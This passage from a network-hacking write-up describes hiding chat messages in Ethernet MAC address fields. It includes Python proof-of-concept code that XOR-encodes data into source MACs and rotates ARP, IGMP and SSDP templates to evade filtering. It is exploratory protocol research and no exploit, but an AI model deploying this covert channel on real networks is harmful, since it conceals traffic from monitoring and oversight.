        if padding != 0:
            msg += b"\x00"*(4-padding) # Adds padding bytes if needed
        else:
            msg += b"\x00\x00\x00\x00" # This adds one null message at the end to signify the message is done
        mlen = len(msg)
        i = 0
        while i < mlen:
            chunk = msg[i:i+4]
            genMessage(chunk,t,srcMac)
            i = i+4
        print("{} -- {}".format(srcMacS, msg.decode()))

if __name__ == "__main__":
    args   = parser.parse_args()
    inMac  = args.inMac

    x = threading.Thread(target=rcv_message, args=(r,))
    x.start()
    y = threading.Thread(target=send_message, args=(t,inMac))
    y.start()
```

A thread is started for both receiving and sending data. You provide a MAC address on the command line which is used to identify your client.

POC Video: [https://twitter.com/netspooky/status/1510010775817097226](https://twitter.com/netspooky/status/1510010775817097226)

Also check out this version using a perl one liner by Samy Kamkar: [https://twitter.com/samykamkar/status/1510326257237430275](https://twitter.com/samykamkar/status/1510326257237430275)

## Reality Choke

So far, the assumption has been that the router will forward these packets to everyone. The reality is that routers (and other protocol stacks) won’t tolerate these spec violations.

What is typical router behavior then? The answer becomes more mysterious the deeper you look.

While testing dst2dst on my router, I noticed that none of the packets actually made it from one computer to another. I went back to the drawing board to double check every script and find out what was going on.

I opened up some RFCs for different multicast addresses and tried to see if there was something I was missing. There are well defined ethernet addresses for multicast which some protocols leverage, but ultimately it’s up to the router to decide what to do with things that violate expected behavior.

I tested with ARP, IGMP, and other packet types, and bruteforced the space for IPv4 and IPv6 multicast addresses to see what went through. The results were all over the place. For IPv4 and IPv6 multicast addresses, the first couple of bytes need to be the same, but the remaining bytes are *supposed to be* tied to the packet contents. This is used for things like IGMP, SSDP, and ICMPv6. I found that these addresses can really be used for whatever your router / OS will tolerate.

You can send an IPv4 packet with an IPv6 multicast eth.dst, and vice versa. You can also send other ethernet protocols over either. Some of the things I experimented with led me to be believe that you could then just use the bottom bytes of these addresses for data. 

In one case, I sent a packet with IPv6 multicast and some random bytes at the end, and my router transformed the packet into an LLC frame. This is not even Ethernet II, it’s literally a whole other protocol ([More info here](https://www.ibm.com/support/pages/ethernet-version-2-versus-ieee-8023-ethernet)). A curious aspect of it too is that when I transmitted ASCII art over it, I immediately saw something strange.

The original packet looked similar to this:

![image](https://user-images.githubusercontent.com/26436276/163653339-5481023c-7a6f-4e0d-994e-672d50b3376f.png)

However, I had changed the Ethernet destination, source, and type to the following values to try to get it forwarded over the router:

- `eth.src == 33:33:4e:45:54:01`
- `eth.dst == 04:04:04:04:04:04`
- `eth.type == 0x0404`

This caused the router to parse this as an LLC frame. The LLC frame was then parsed as SNA by Wireshark, which is an IBM mainframe protocol. This resulted in Wireshark processing the data as EBCDIC instead of ASCII...The frame was modified by the router, which was confirmed by the Length field for 802.3 ethernet being correct (0x1F2), when previously it was set to 0x0404.

![image](https://user-images.githubusercontent.com/26436276/163653347-1f2cd76e-16ca-4ad7-b831-6b16ff1fec5a.png)

I turned this into an even smaller POC to check if the encoding would change and get processed as an LLC frame, and it did. [https://twitter.com/netspooky/status/1514808243997995013](https://twitter.com/netspooky/status/1514808243997995013)

Testing it on the `vmnet` interface showed that Wireshark parsed a smaller test packet as LLC/SNA still, but the router didn’t change the length field when sent broadcast. This is the packet from a different VM receiving the packet.

![image](https://user-images.githubusercontent.com/26436276/163653358-43ff7b67-fadb-4783-9191-60d8d7037d60.png)

It’s unclear why this even works, because the eth.src is an invalid IPv6 multicast address anyways.

More testing showed me that certain byte combos can’t be used. I decided to test each byte of both IPv6 and IPv4 to see if there was even one byte of the address that I could use reliably for data. The results were even stranger than I expected...a pattern appeared. There were 5 bytes that each field could be if the other bytes were 0. I immediately thought about creating an encoding scheme based on these patterns to encode data into a multicast address.

Here’s an example of what I thought of for the bottom 4 bytes of IPv6 (the top being the constant `33:33`):

![image](https://user-images.githubusercontent.com/26436276/163653369-84675f23-327d-4dfa-9221-95a64c17c5f6.png)

Testing this, certain combinations of bytes also didn’t sent...why???

Frustrated, I created a script to run through a series of tests to double check what was receivable by another host when a packet was sent as multicast. This opened up the floodgates of even more confusion.

A friend ran my scripts on their network, and had entirely different results than me. Some of the combinations didn’t go through at all, and other patterns appeared. Additionally, they enabled a feature for IGMP snooping, and the latency of packet processing revealed a difference in the order of packets received from the router. Now we have a possible way to profile a router by sending some multicast packets.

The last major thing was that operating systems themselves might also reject certain packets. When testing with Windows, the IPv4 and IPv6 packets that my router did forward were dropped. This led me to abandon the idea all together.

I wanted a more universal solution, but was running out of options.

## Source Direct

It was back to the drawing board for figuring out where data can be stored and not dropped by the router. The most obvious solution was to use `eth.src` instead.

The problem now is that we can’t use this field to differentiate streams anymore. The encoding schema will now have to be modified to allow for an address field, similar to the zeroeth reverse shell from before. By keeping the xor key, checksum, and adding this byte, we will now only have 3 bytes to work with. This is plenty of space, but since mysterious router behavior is also a factor, we will need something to help signal when messages begin and end. This will help avoid corrupted or incomplete communications.

To implement this, there could be another bit field, but that would reduce our space even more. The solution I came up with was to create a buffer using control characters to signal things about the data. The ASCII STX character (0x02) indicates the beginning of the message, while the ASCII ETX character (0x03) indicates the end. The data is encoded in base64, which ensures that the relevant message payload will be within a certain range of bytes. This means that error checking can be done on the decoded data and help reduce garbled messages. Lastly, the padding is randomized every time, which means patterns are less likely to be noticed with frequency analysis.

Our `eth.dst` field will now look like this:

![image](https://user-images.githubusercontent.com/26436276/163653387-59fb8852-04a0-4184-9a40-2a187e9810c6.png)

The data would be transformed like so:

- Plain Text: netspooky
- Base64 Encoded: bmV0c3Bvb2t5
- Afterwards, this would be XOR'd like in the previous scheme

When encoded, it will look like this (without XOR encoding)

![image](https://user-images.githubusercontent.com/26436276/163653401-6cbb6487-a6d9-4ff4-815b-21c2197203d0.png)

The RR routing info field looks like this:

![image](https://user-images.githubusercontent.com/26436276/163653416-3bacc3dc-469e-4fee-bc73-9985f9c53f22.png)

Each source and destination is 4 bits of RR, with a node number from 1 through 15 and a special multicast node at 0. This would enable both point to point messaging, as well as multicast / global communication.

The packets themselves now don’t matter, so long as they are multicast. This means we can then cycle through a list of packet templates to diversify traffic and potentially evade filtering.

This is the code for the srcdirect.py demo:

```python
import base64
import sys
import random
from socket import *
import argparse
import threading

parser = argparse.ArgumentParser(description='srcdirect')
parser.add_argument('-i', dest='interface', help='Your interface')
parser.add_argument('-s', dest='srcnode', type=int, help='Your node number, range (1-15)')

args   = parser.parse_args()
interface = args.interface
srcnode = args.srcnode
if srcnode < 1 or srcnode > 15:
    print("Invalid source node, range is 1 to 15")
    sys.exit()

msgBufz = {} # These are buffers for holding messages from each host

def getChecksum(inData):
    c = 0 # Our checksum is just 1 byte
    for d in inData:
        c = (c + d) % 256
    return c

def getTemplate():
    # - The idea here is to have a set of packet templates to diversify traffic patterns
    # - The decoding logic only checks the IG bit of eth.dst, so any multicast packet
    #   is fair game for holding this data.
    # - You can dynamically generate templates too, this just a POC
    arp =  b"" # ARP Request
    arp += b"\x08\x06"                 # eth.type (ARP)
    arp += b"\x00\x01"                 # arp.hw.type        -- Hardware Type: Ethernet
    arp += b"\x08\x00"                 # arp.proto.type     -- Protocol Type: IPv4
    arp += b"\x06"                     # arp.hw.size        -- Hardware Size: 6
    arp += b"\x04"                     # arp.proto.size     -- Protocol Size: 4
    arp += b"\x00\x01"                 # arp.opcode         -- Opcode: Request
    arp += b"\x00\x11\x22\x33\x44\x55" # arp.src.hw_mac     -- Source MAC Address
    arp += b"\x0a\x00\x01\x0a"         # arp.src.proto_ipv4 -- Source IP: 10.0.1.10
    arp += b"\x00\x00\x00\x00\x00\x00" # arp.dst.hw_mac     -- Target MAC Address
    arp += b"\x0a\x00\x01\x0b"         # arp.dst.proto_ipv4 -- Target IP: 10.0.1.11

    igmp =  b"" # IGMP Membership Query (General)
    igmp += b"\x08\x00"         # eth.type = ipv4
    igmp += b"\x45\xc0"         # ip dsfield, len
    igmp += b"\x00\x1c"         # ip.len 
    igmp += b"\xac\xab"         # ip.id
    igmp += b"\x00\x00\x01"     # ip.flags, ip.frag_offset, ip.ttl
    igmp += b"\x02"             # ip.proto      -- IGMP
    igmp += b"\x4e\x53"         # ip.checksum
    igmp += b"\x0a\x0a\x01\x01" # ip.src        -- 10.10.1.1
    igmp += b"\xe0\x00\x00\x01" # ip.dst        -- 224.0.0.1
    igmp += b"\x11"             # igmp.type     -- Membership query
    igmp += b"\x64"             # igmp.max_resp
    igmp += b"\xee\x9b"         # igmp.checksum
    igmp += b"\x00\x00\x00\x00" # igmp.maddr 

    ssdp = b"" # SSDP M-SEARCH template
    ssdp += b"\x08\x00"         # eth.type = ipv4
    ssdp += b"\x45\x00"         # ip dsfield, len
    ssdp += b"\x00\xc7"         # ip.len
    ssdp += b"\xac\xab"         # ip.id
    ssdp += b"\x40\x00\x01"     # ip.flags, ip.frag_offset, ip.ttl
    ssdp += b"\x11"             # ip.proto      -- UDP
    ssdp += b"\x4e\x53"         # ip.checksum
    ssdp += b"\x0a\x0a\x01\x01" # ip.src        -- 10.10.1.1
    ssdp += b"\xef\xff\xff\xfa" # ip.dst        -- 239.255.255.250
    ssdp += b"\xc7\x64"         # udp.srcport
    ssdp += b"\x07\x6c"         # udp.dstport
    ssdp += b"\x00\xb3"         # udp.length (179)
    ssdp += b"\x3a\x29"         # udp.checksum
    ssdp += b"M-SEARCH * HTTP/1.1\x0d\x0a"
    ssdp += b"HOST: 239.255.255.250:1900\x0d\x0a"
    ssdp += b"MAN: \"ssdp:discover\"\x0d\x0a"
    ssdp += b"MX: 1\x0d\x0a"
    ssdp += b"ST: urn:dial-multiscreen-org:service:dial:1\x0d\x0a"
    ssdp += b"USER-AGENT: iNNAnet xXxPlora 420.69 Z00buntu"
    ssdp += b"\x0d\x0a\x0d\x0a"

    pkttemplates = [arp,igmp,ssdp]
    return random.choice(pkttemplates)

def encodeMsg(inData,srcnode,dstnode):
    # This is the message structure, stuffed into the eth.src field
    #  ┌───────────────────── XOR Key
    #  │   ┌───────────────── Checksum
    #  │   │   ┌───────────── Routing info
    #  │   │   │   ┌───────── The 02 is the ASCII STX character
    # ┌┴─┐┌┴─┐┌┴─┐┌│─Text──┐ # Hex dump of plain text
    # │XR││CS││RR││02 62 6d│ # .bm  ┐
    # │XR││CS││RR││56 30 63│ # V0c  │
    # │XR││CS││RR││33 42 76│ # 3Bv  ├─ Base64 of "netspooky"
    # │XR││CS││RR││62 32 74│ # b2t  │
    # │XR││CS││RR││35 03 xx│ # 5..  ┘
    # └──┘└──┘└──┘└───│──│─┘
    #                 │  └─── Padding
    #                 └────── The 03 is the ASCII ETX character
    srcenc = srcnode & 0x0F
    dstenc = dstnode << 4 # shift the value to occupy the top 4 bits
    rr = dstenc | srcenc
    msgSeed = random.randrange(0,256)
    msgSeed = msgSeed & 0xFE # Ensure the bottom bit is never set
    msgBuf  = b""
    csum = getChecksum(inData)
    msgBuf += bytes([msgSeed])        # eth.src[0]
    msgBuf += bytes([msgSeed ^ csum]) # eth.src[1]
    msgBuf += bytes([( ( msgBuf[1] + csum ) % 256 ) ^ rr]) # eth.src[2]
    msgBuf += bytes([( ( msgBuf[2] + csum ) % 256 ) ^ inData[0]]) # eth.src[3]
    msgBuf += bytes([( ( msgBuf[3] + csum ) % 256 ) ^ inData[1]]) # eth.src[4]
    msgBuf += bytes([( ( msgBuf[4] + csum ) % 256 ) ^ inData[2]]) # eth.src[5]
    return msgBuf

def decodeMessage(inData):
    csum = inData[0] ^ inData[1] # eth.src[0] ^ eth.src[1]
    rr = ( ( inData[1] + csum ) % 256 ) ^ inData[2] # eth.src[2]
    srcdec = rr & 0x0F
    dstdec = rr >> 4
    # If the source node is the sending node, then messages are ignored.
    if srcdec != srcnode:
        msgBuf = b""
        msgBuf += bytes([( ( inData[2] + csum ) % 256 ) ^ inData[3]]) # eth.src[3]
        msgBuf += bytes([( ( inData[3] + csum ) % 256 ) ^ inData[4]]) # eth.src[4]
        msgBuf += bytes([( ( inData[4] + csum ) % 256 ) ^ inData[5]]) # eth.src[5]
        calcSum = getChecksum(msgBuf)
        # Checksums are calculated on the data and compared to the reported checksum
        # - If it matches, then it continues processing.
        # - This could use some work but it's a POC y'all.
        if csum == calcSum:
            if srcdec not in msgBufz.keys():
                msgBufz[srcdec] = b"" # When a new source is found, it adds to the buffer list
            if msgBuf[0] == 2: # This detects the STX (0x02) character indicating message start
                msgBufz[srcdec] = msgBuf # Adds the contents to the src's buffer in the list
            elif b"\x03" in msgBuf: # This detects the ETX (0x03) character indicating message end.
                msgBufz[srcdec] += msgBuf # Add the content to the src's buffer
                outMsg = msgBufz[srcdec][1:] # This grabs the message after STX
                outMsg = outMsg.split(b"\x03")[0] # This grabs the message before ETX
                try:
                    # Attempt to decode and print the buffer, then clear the buffer
                    print("{}: {}".format(srcdec, base64.b64decode(outMsg).decode('latin-1')))
                    msgBufz[srcdec] = b""
                except:
                    # If there's a decoding failure then clear the buffer
                    msgBufz[srcdec] = b""
            else:
                msgBufz[srcdec] += msgBuf

def makeBuffer(inData,csum):
    # This just adds the ASCII control chars to the data
    buf = b""
    buf += b"\x02" # STX
    buf += inData
    buf += b"\x03" # ETX
    return buf

def rcvMessage(inSock):
    while True:
        packet = inSock.recvfrom(65565)
        packet = packet[0]
        igbit = packet[0] & 1 # Check the bottom bit of the first byte
        if igbit:
            ethdst  = packet[0:6]
            ethsrc  = packet[6:12]
            decodeMessage(ethsrc) # Attempt to decode

def sendMessage(inData,dstnode,srcnode,inSock):
    i = 0
    padding = (len(inData) % 3)
    if padding != 0:
        randpad = bytes([random.randrange(80,255)]) # Get a random number outside the range we use
        inData += randpad*(3-padding) # Adds padding bytes if needed
    mlen = len(inData)
    # Split the buffer into three byte chunks, do the encoding, and stuff into a packet template.
    while i < mlen:
        chunk = inData[i:i+3]
        p = b"\xFF\xFF\xFF\xFF\xFF\xFF" # eth.src
        p += encodeMsg(chunk, srcnode, dstnode) # eth.dst
        p += getTemplate() # packet body
        inSock.send(p)
        i = i+3

def msgLoop(t):
    for line in sys.stdin:
        dstnode = 0
        msg = line.rstrip()
        msg = msg.encode('latin-1')
        b64msg = base64.b64encode(msg)
        csum = getChecksum(msg)
        pktbuf = makeBuffer(b64msg,csum)
        sendMessage(pktbuf,dstnode,srcnode,t)

if __name__ == "__main__":
    t = socket(AF_PACKET, SOCK_RAW) # This is the socket to transmit
    t.bind((interface, 0))
    r = socket( AF_PACKET, SOCK_RAW, ntohs(0x0003)) # This is how msgs are received
    x = threading.Thread(target=rcvMessage, args=(r,)) # Thread for receive loop
    x.start()
    y = threading.Thread(target=msgLoop, args=(t,)) # Thread for transmit loop
    y.start()
```

To run it, just do:

```python
$ sudo python3 srcdirect.py -i yourinterface -s somenumber_between_1_and_15
```

Do the same with a different number as an argument to `-s` and chat using the multicast node 0.

POC video here: [https://twitter.com/netspooky/status/1515102935595765776](https://twitter.com/netspooky/status/1515102935595765776)

There was some drama with my wireless card which I think I may have messed up through my testing. Certain packets became garbled for some reason, and others were just dropped. This was tested on both Netgear and Linksys routers between three hosts, all connected directly over ethernet.

## There’s No OUI Without U and I

Hopefully this got you interested in playing with network stuff more! If you have any questions, comments, or your router caught fire, hit me up on [Twitter](https://twitter.com/netspooky).

Special thanks to: remy, Samy Kamkar, Mike Lynn, bigendiansmalls, hermit, chompie, birch, bbq, hyp, kayos, everyone who tested stuff with me, everyone who made their own versions of the things I was sharing prior to releasing this writeup, tchq, and tmp.0ut!
